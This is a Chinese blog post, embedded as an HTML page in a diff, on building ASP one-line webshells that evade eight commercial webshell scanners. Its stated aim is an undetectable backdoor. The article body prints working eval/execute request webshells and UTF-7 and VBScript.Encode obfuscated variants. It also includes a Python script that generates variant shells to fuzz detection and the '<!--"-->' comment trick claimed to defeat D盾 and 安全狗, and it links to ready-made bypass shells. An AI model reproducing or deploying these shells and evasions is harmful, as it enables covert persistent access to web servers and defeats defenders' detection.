@@ -1,0 +1,1303 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00：前言随着时间的推移和其它新型动态网页技术的兴起，使用ASP(Active Server Page)技术构建的Web应用越来越少。ASP的衰落、旧资料和链接的失效、前辈们早期对ASP较多的研究，都导致了新型ASP网站后门和技术研究的减少。 本篇文章主要梳理ASP一句话Webshell的构建和规避检测软件达到源文件免杀的思路。最终构建能够同时绕过以下表格中8个专业木马查杀工具和平台检测的We">
+<meta property="og:type" content="article">
+<meta property="og:title" content="asp马-bypass">
+<meta property="og:url" content="http://alin.run/2020/08/04/asp-webshell-bypass/index.html">
+<meta property="og:site_name" content="alin&#39;Blog">
+<meta property="og:description" content="0x00：前言随着时间的推移和其它新型动态网页技术的兴起，使用ASP(Active Server Page)技术构建的Web应用越来越少。ASP的衰落、旧资料和链接的失效、前辈们早期对ASP较多的研究，都导致了新型ASP网站后门和技术研究的减少。 本篇文章主要梳理ASP一句话Webshell的构建和规避检测软件达到源文件免杀的思路。最终构建能够同时绕过以下表格中8个专业木马查杀工具和平台检测的We">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetkjxbaoj30gj09vn10.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetkmmgiwj30ik0awmxh.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetkrwobyj30j101gdfl.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetkybynjj30b102dt8j.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetl18bvmj309s02xjro.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetl341w7j30fu0ae0t2.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetl5sxvrj30nv03jmy5.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetl6rhk7j30gz09qwfd.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetlamvkcj30jh0g33zb.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetledhurj30b60a2mxo.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetlh2zkxj30lk092weu.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetlklnvuj30lm084aad.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetlna24cj30y30fcwlm.jpg">
+<meta property="article:published_time" content="2020-08-04T07:46:28.000Z">
+<meta property="article:modified_time" content="2020-08-04T07:47:22.393Z">
+<meta property="article:author" content="alin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetkjxbaoj30gj09vn10.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://alin.run/2020/08/04/asp-webshell-bypass/"/>
+
+
+
+
+
+  <title>asp马-bypass | alin'Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?5e6a61cde714ee04a36217a052cbca33";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">alin'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://alin.run/2020/08/04/asp-webshell-bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="alin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/mao.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="alin'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">asp马-bypass</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-04T15:46:28+08:00">
+                2020-08-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h3><p>随着时间的推移和其它新型动态网页技术的兴起，使用ASP(Active Server Page)技术构建的Web应用越来越少。ASP的衰落、旧资料和链接的失效、前辈们早期对ASP较多的研究，都导致了新型ASP网站后门和技术研究的减少。</p>
+<p>本篇文章主要梳理ASP一句话Webshell的构建和规避检测软件达到源文件免杀的思路。最终构建能够同时绕过以下表格中8个专业木马查杀工具和平台检测的Webshell，构造出零提示、无警告、无法被检测到的ASP一句话木马后门。</p>
+<table>
+<thead>
+<tr>
+<th>编号</th>
+<th>名称</th>
+<th>参考链接</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>网站<strong>安全狗</strong>(IIS 4.0)</td>
+<td><a href="http://download.safedog.cn/download/software/safedogIISV4.0.exe" target="_blank" rel="noopener">http://download.safedog.cn/download/software/safedogIISV4.0.exe</a></td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>D盾Web查杀</strong> V2.0.9</td>
+<td><a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip" target="_blank" rel="noopener">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a></td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>D盾防火墙</strong> v2.0.6.92</td>
+<td><a href="http://www.d99net.net/down/d_safe_2.0.6.92.zip" target="_blank" rel="noopener">http://www.d99net.net/down/d_safe_2.0.6.92.zip</a></td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>深信服</strong>WebShellKillerTool(2017)</td>
+<td><a href="http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip" target="_blank" rel="noopener">http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip</a></td>
+</tr>
+<tr>
+<td>5</td>
+<td><strong>360主机卫士</strong>v2.0.5.9</td>
+<td><a href="http://down-www.newasp.net/pcdown/soft/dys/360WebSafe_Setup.rar" target="_blank" rel="noopener">http://down-www.newasp.net/pcdown/soft/dys/360WebSafe_Setup.rar</a></td>
+</tr>
+<tr>
+<td>6</td>
+<td><strong>护卫神</strong>云查杀系统(V4.5)</td>
+<td><a href="http://down.huweishen.com/free/HwsKill.zip" target="_blank" rel="noopener">http://down.huweishen.com/free/HwsKill.zip</a></td>
+</tr>
+<tr>
+<td>7</td>
+<td><strong>OpenRASP</strong> WEBDIR+ Webshell检测</td>
+<td><a href="https://scanner.baidu.com" target="_blank" rel="noopener">https://scanner.baidu.com</a></td>
+</tr>
+<tr>
+<td>8</td>
+<td><strong>河马专业版</strong>查杀Webshell</td>
+<td><a href="http://n.shellpub.com/" target="_blank" rel="noopener">http://n.shellpub.com/</a></td>
+</tr>
+</tbody></table>
+<h3 id="0x01：ASP执行流程和原理"><a href="#0x01：ASP执行流程和原理" class="headerlink" title="0x01：ASP执行流程和原理"></a>0x01：ASP执行流程和原理</h3><p>ASP脚本原生支持通过<strong>VBScript</strong>和<strong>JScript</strong>两种脚本语言来建立动态页面，本质上是将PC端的脚本执行能力迁移到了服务器。使用ASP技术构建的网站，通常都是部署在IIS或PWS服务器上。</p>
+<p>借用一个简图表示浏览器请求一个ASP脚本的流程：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetkjxbaoj30gj09vn10.jpg" alt="ASP脚本工作流程"></p>
+<blockquote>
+<p>当Web应用服务器(IIS)判断出请求是访问ASP脚本后，自动通过<strong>Isapi</strong>模块调用ASP脚本的解释运行引擎<strong>asp.dll</strong>。asp.dll从文件系统或内部缓冲区中获取ASP脚本的文本内容，然后进行语法分析并解释执行。</p>
+</blockquote>
+<p>如下图所示，在IIS服务器的”处理程序映射”配置中，可以设置特定路径文件的解析引擎。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetkmmgiwj30ik0awmxh.jpg" alt="ASP脚本工作流程"></p>
+<p>ASP脚本中的代码块一般被包裹在<code>&lt;% %&gt;</code>标签中，默认以VBscript语言进行解释。除此之外，还可以使用 <code>&lt;%@ language=&quot;VBscript&quot; %&gt;</code>或者</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"VBScript"</span> runat=<span class="string">"server"</span>&gt; some-vbscript-code &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>标签，显性的告诉服务器脚本使用VBscript语言进行解释。同理可将language指定为<code>JScript</code>，则表示用微软实现的JavaScript语言解释服务器上的ASP脚本中的代码。ASP脚本中的基本语法可参考ASP、VbScript和JScript各自的参考手册，本文不再赘述。</p>
+<h3 id="0x02：ASP支持的注释方式"><a href="#0x02：ASP支持的注释方式" class="headerlink" title="0x02：ASP支持的注释方式"></a>0x02：ASP支持的注释方式</h3><p>ASP脚本中支持<strong>五种注释方式</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#39;			单引号		（单行注释）</span><br><span class="line">REM 		rem+空格	 （单行注释）</span><br><span class="line">&#x2F;&#x2F;			双斜线      (单行注释，VBscript，JScript可用，仅支持IIS)</span><br><span class="line">&lt;!-- --&gt;	HTML注释符  (单行注释，VBscript可用，仅支持IIS)</span><br><span class="line">&#x2F;* *&#x2F;		多行注释符 （多行注释，JScript可用）</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03：ASP一句话后门现状"><a href="#0x03：ASP一句话后门现状" class="headerlink" title="0x03：ASP一句话后门现状"></a>0x03：ASP一句话后门现状</h3><p>ASP脚本中，主要用以下三个VBscript函数执行代码，也是我们构造ASP一句话木马的<strong>入口</strong>。下面是用三个函数分别构建对应长度最短的密码为<code>0</code>的ASP一句话后门示例：</p>
+<ul>
+<li><p>Eval</p>
+<p><code>&lt;%eVAl reQuEst(0)%&gt;</code></p>
+</li>
+<li><p>Execute</p>
+<p><code>&lt;%exECuTe ReqUEst(0)%&gt;</code></p>
+</li>
+<li><p>ExecuteGlobal</p>
+<p><code>&lt;%eXECutegLobaL rEquEst(0)%&gt;</code></p>
+</li>
+</ul>
+<p>遗憾的是VBscript语言和其它高级语言相比，语法结构偏向简单。代码层面上很难隐藏上面三个函数的敏感词<code>Eval</code>、<code>Execute</code>和<code>ExecuteGlobal</code> 。</p>
+<p>目前用的较多的隐藏以上三个敏感词的两种方式如下：</p>
+<ul>
+<li><p><strong>使用UTF-7编码脚本</strong></p>
+<p>一个密码为”LandGrey”的原始ASP一句话脚本代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@codepage&#x3D;65000%&gt;</span><br><span class="line">&lt;%response.codepage&#x3D;65001:eval(request(&quot;LandGrey&quot;))%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>UTF-7编码后<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/utf7-bypass.asp" target="_blank" rel="noopener">utf7-bypass.asp</a>脚本内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@codepage&#x3D;65000%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">+AHIAZQBzAHAAbwBuAHMAZQAuAGMAbwBkAGUAcABhAGcAZQA9ADYANQAwADAAMQA6AGUAdgBhAGwAKAByAGUAcQB1AGUAcwB0ACgAIgBMAGEAbgBkAEcAcgBlAHkAIgApACk-</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这种方式可以<strong>躲过较多webshell检测软件查杀</strong>，但是D盾Webshell查杀工具，提示脚本使用了UTF-7编码，并不能做到完全不被察觉。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetkrwobyj30j101gdfl.jpg" alt="UTF-7编码一句话"></p>
+</li>
+<li><p><strong>使用VBScript.Encode功能编码脚本</strong></p>
+<p>ASP脚本默认可以使用内置的Encoder工具，对代码进行混淆，以保护源码的安全性。写一个vbs脚本，内容如下：</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExecuteGlobal request(<span class="string">"LandGrey"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>使用微软的工具运行命令<code>screnc.exe script.vbs script.vbe</code>，得到结果</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#@~^IQAAAA==3X+^!YMVK4msPM+5E/OcrSl	[MM+Xrb+AsAAA==^#~@</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就可以构建一个密码为”LandGrey”的编码混淆后的一句话木马脚本。注意里面有不可打印字符，需要使用的话，请下载<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/vbencode-bypass.asp" target="_blank" rel="noopener">vbencode-bypass.asp</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ LANGUAGE &#x3D; &quot;VBScript.Encode&quot;%&gt;</span><br><span class="line">&lt;%#@~^IQAAAA&#x3D;&#x3D;3X+^!YMVK4msPM+5E&#x2F;OcrSl	[MM+Xrb+AsAAA&#x3D;&#x3D;^#~@%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这种方式也可以绕过较多的查杀工具，但D盾会解码混淆后的脚本，然后再判断是否是恶意脚本，构造出来的一句话脚本木马依然会被查杀。</p>
+</li>
+</ul>
+<p>接着就陷入了较长时间的进度停滞，堆积各种代码姿势和测试已经公开的一句话木马，均不能躲过”<strong>D盾</strong>“的毒手。</p>
+<p>期间人工测试了大量代码，也试图通过fuzzing，来构造<code>eval{some-char}RequEst(&quot;LandGrey&quot;)</code>形式的代码，尝试找到可以连接在eval和request之间的特殊字符，让ASP引擎既能正常解析脚本，又能绕过软件检测，结果失败了。</p>
+<h3 id="0x04：研究思路梳理"><a href="#0x04：研究思路梳理" class="headerlink" title="0x04：研究思路梳理"></a>0x04：研究思路梳理</h3><p>从以上小节的相关介绍可以看出目前构造完全免杀的ASP一句话木马的主要困难点：</p>
+<ul>
+<li>ASP网页构建技术出现时间较早，相关技术较为成熟</li>
+<li>难找到以往从没出现过的新型技术构建一句话木马</li>
+<li>构建ASP网页相关的语法结构偏向简单</li>
+<li>ASP Webshell被限定在仅使用一个ASP脚本，构造一句话木马</li>
+<li>各种成熟的Webshell查杀工具对以往各类一句话木马均有所防范</li>
+</ul>
+<p>要成功构造出能同时绕过以上表格中8款Webshell检测工具和平台的ASP一句话木马，存在一定的困难，不梳理下构造思路，最终很可能会做无用功。</p>
+<p>虽然如此，但是现在研究构造免杀的ASP一句话木马也存在一定的有利条件：</p>
+<ul>
+<li>ASP构建的Web应用的减少直接导致查杀软件对<strong>ASP木马查杀的重视程度降低</strong></li>
+<li>针对ASP木马的查杀技术还停留在<strong>正则表达式特征匹配</strong>方面</li>
+<li>大多数Webshell检测工具的<strong>ASP特征库版本很久没有更新</strong>了</li>
+</ul>
+<p>想要绕过检测，可以进行以下操作</p>
+<ol>
+<li>先收集以往的各种ASP一句话木马样本</li>
+<li>多使用几种最新版的本地查杀工具进行<strong>断网检测</strong>，交叉验证，比对查杀情况</li>
+<li>针对所有的ASP一句话木马样本使用的技术进行简单分类</li>
+<li>重点分析能侥幸绕过一两款工具的单个木马样本</li>
+<li>熟读语法手册和官方文档和原木马样本，不断增删代码，找到绕过检测的”命脉”</li>
+<li>结合木马所使用的技术方法进行Webshell语法特性方面的深入挖掘</li>
+<li>找到目前已知所有可以执行ASP代码或命令的函数或语法特性，进行相关拓展或替换</li>
+<li>针对单个查杀效果较好的本地工具，不断进行手工测试绕过，必要时辅助Fuzzing技术</li>
+</ol>
+<h3 id="0x05：绕过D盾检测"><a href="#0x05：绕过D盾检测" class="headerlink" title="0x05：绕过D盾检测"></a>0x05：绕过D盾检测</h3><p>上面介绍了，既然D盾规则库比较全，那就先从突破<strong>D盾Web查杀</strong>工具开始。</p>
+<h4 id="一-填充垃圾数据插入特殊字符串绕过"><a href="#一-填充垃圾数据插入特殊字符串绕过" class="headerlink" title="一. 填充垃圾数据插入特殊字符串绕过"></a>一. 填充垃圾数据插入特殊字符串绕过</h4><p>经过0x03小节的分析和大量测试，我不仅怀疑现在是否还能找到仅通过单个脚本，就能构造出绕过D盾Webshell查杀的ASP一句话木马。直到我偶然发现下面代码中一个有趣的地方：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetkybynjj30b102dt8j.jpg" alt="注释符的特性"></p>
+<p>第二行代码用单引号注释掉了<code>%&gt;</code>符号，按理来说，对脚本的执行并没有影响。但是发现如下图，ASP引擎忽略了单引号注释符，将脚本中第一个<code>%&gt;</code>以后的字符全部截断，而且同时D盾也查不出来脚本有异常了。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetl18bvmj309s02xjro.jpg" alt="ASP引擎截断"></p>
+<p>ASP引擎和D盾的解析如此相似，内部实现可以看成进入<code>&lt;%</code>符号时，就急于寻找<code>%&gt;</code>符号闭合这段代码，而造成忽略单引号注释符和造成代码截断的情况。以此为突破口，人肉fuzzing，终于找到绕过D盾，但可以让ASP引擎解析的一段代码<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/glorysday.asp" target="_blank" rel="noopener">glorysday.asp</a>：</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetl341w7j30fu0ae0t2.jpg" alt=""></p>
+<p>构造以上代码需要：</p>
+<ul>
+<li>利用<strong>注释符</strong></li>
+<li>利用<code>&#39;%&gt;</code>和<code>&#39;&lt;%</code>分别闭合前后标签</li>
+<li>填充大量垃圾<code>&lt;%%&gt;</code>标签，且最后文件体积大小要合适(测试发现文件大小约&gt;0.97 MB)</li>
+<li>必须要在<strong>一定位置</strong>插入至少一个<code>&lt;??&gt;</code>字符串</li>
+</ul>
+<p>页面浏览该脚本页面，就会发现很多作为注释符，但没生效的单引号</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetl5sxvrj30nv03jmy5.jpg" alt=""></p>
+<p>使用Cknife可以正常连接该一句话</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetl6rhk7j30gz09qwfd.jpg" alt=""></p>
+<p>上面提到的的特殊位置插入<code>&lt;??&gt;</code>是绕过检测的必要手段，不能增减一个字符。具体原因可能和D盾软件内部实现的Bug有关，这里不深入追究，感兴趣的同学可以自己接着去研究。</p>
+<p>脚本中作为注释符号的单引号，可以使用其它三种注释符替换，依然可以绕过。</p>
+<h4 id="二-使用-lt-quot-gt-百分百绕过D盾检测"><a href="#二-使用-lt-quot-gt-百分百绕过D盾检测" class="headerlink" title="二.  使用&lt;!--&quot;--&gt;百分百绕过D盾检测"></a>二.  使用<code>&lt;!--&quot;--&gt;</code>百分百绕过D盾检测</h4><p>靠着运气和玄学的成份，我们绕过了<strong>D盾Web查杀</strong>检测。既然注释符号和<code>&lt;??&gt;</code>符号对D盾来说会产生意想不到的Bug效果，那么猜想，可能会有其它更简单的方式，绕过D盾的检测。</p>
+<p>首先选个一定会被杀掉的简单ASP一句话脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">execute(request(&quot;LandGrey&quot;))</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们在脚本中的第一个<code>&lt;%</code>符号标记后面，<code>execute</code>标记前面，插入不同字符，查看D盾的检测反应。用下面的Python脚本在两个标记中间插入ascii值为0-255的字符，批量生成测试脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(count)</span>:</span></span><br><span class="line">    template = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">&#123;0&#125;</span></span><br><span class="line"><span class="string">execute(request("LandGrey"))</span></span><br><span class="line"><span class="string">%&gt;"""</span>.format(chr(count))</span><br><span class="line">    <span class="keyword">with</span> open(os.path.join(path, <span class="string">"fuzz_&#123;&#125;.asp"</span>.format(count)), <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(template)</span><br><span class="line"></span><br><span class="line">path = <span class="string">r"/path/to/yours/"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">    generate(c)</span><br></pre></td></tr></table></figure>
+
+<p>然后用D盾检测，出现了较为意外的结果，发现256个文件中，只检测出来了122个Webshell。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetlamvkcj30jh0g33zb.jpg" alt=""></p>
+<p>选一个没有检测到的脚本fuzz_34.asp，发现只是增加了一个双引号<code>&quot;</code>。当然，多个<code>&quot;</code>双引号这个脚本也不能正常执行了。</p>
+<p>然后就结合四种VBscript可用的注释符，尝试找到能让脚本能正常执行，又绕过工具检测的方法。结果发现使用<code>&lt;!-- --&gt;</code>注释符加双引号<code>&quot;</code>的形式，构造出<code>&lt;!--&quot;--&gt;</code>字符串，就可以利用D盾的软件缺陷，完全绕过D盾的ASP木马检测。让先前被杀的脚本，插上放飞的翅膀。</p>
+<p>一个可以绕过D盾检测的简单脚本<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/asp/use-html-annotator-bypass.asp" target="_blank" rel="noopener">use-html-annotator-bypass.asp</a>如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">&lt;!--&quot;--&gt;</span><br><span class="line">execute request(&quot;LandGrey&quot;)</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其它几乎所有的ASP木马脚本，只要在上面提到的正确位置插入了<code>&lt;!--&quot;--&gt;</code>字符串，都可以绕过D盾的检测。</p>
+<h3 id="0x06-绕过安全狗检测"><a href="#0x06-绕过安全狗检测" class="headerlink" title="0x06: 绕过安全狗检测"></a>0x06: 绕过安全狗检测</h3><p>在”<strong>0x05:绕过D盾检测</strong>“部分，我们找到了两种绕过方法。有趣的是，测试发现安全狗也部分存在<code>&lt;!--&quot;--&gt;</code>绕过的Bug问题。</p>
+<h4 id="一-使用-lt-quot-gt-符号绕过检测"><a href="#一-使用-lt-quot-gt-符号绕过检测" class="headerlink" title="一.使用&lt;!--&quot;--&gt;符号绕过检测"></a>一.使用<code>&lt;!--&quot;--&gt;</code>符号绕过检测</h4><p>如下图的两个脚本</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetledhurj30b60a2mxo.jpg" alt=""></p>
+<p>用安全狗进行检测，只要插入了<code>&lt;!--&quot;--&gt;</code>字符串，就可以绕过。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetlh2zkxj30lk092weu.jpg" alt=""></p>
